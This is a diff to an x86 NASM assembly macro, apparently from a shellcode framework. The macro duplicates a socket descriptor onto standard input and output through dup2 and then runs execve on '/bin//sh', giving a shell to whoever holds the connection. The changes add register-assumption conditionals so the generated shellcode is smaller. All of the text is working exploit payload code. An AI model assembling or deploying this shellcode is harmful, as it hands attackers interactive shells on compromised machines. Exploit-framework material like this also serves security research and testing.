@@ -52,8 +52,10 @@ BITS 32
 	%if %1 & EXECUTE_REDIRECT_IO
 
 dup:
+%if ASSUME_REG_EDX != 2
 	push byte 0x2
 	pop  ecx
+%endif
 dup_loop:
 %if ASSUME_REG_EAX == 0
 	mov  al, 0x5a
@@ -61,41 +63,54 @@ dup_loop:
 	push byte 0x5a
 	pop  eax
 %endif
+%if ASSUME_REG_EDX == 2
+	push edx
+%else
 	push ecx
+%endif
 %ifdef FD_REG_EBX
 	push ebx
 %else
 	push edi
 %endif
+%if ASSUME_REG_EDX == 2
+	push edx
+%else
 	push ecx
+%endif
 	int  0x80
+%if ASSUME_REG_EDX == 2
+	dec  edx
+%else
 	dec  ecx
+%endif
 	jns  dup_loop
 
 	%endif
 
 execve:
 %if ASSUME_REG_EAX == 0
-	mov  al, 0x3b
+	push eax
 %else
 	push byte 0x3b
 	pop  eax
-%endif
-%if ASSUME_REG_EDX == 0
-%else
 	cdq
-%endif
 	push edx
+%endif
 	push dword 0x68732f2f
 	push dword 0x6e69622f
 	mov  ebx, esp
+%if ASSUME_REG_EAX == 0
+	push eax
+%else
 	push edx
-	push ebx
-	mov  ecx, esp
-	push edx
-	push ecx
+%endif
+	push esp
 	push ebx
 	push ebx
+%if ASSUME_REG_EAX == 0
+	mov  al, 0x3b
+%endif
 	int  0x80
 
 %endmacro
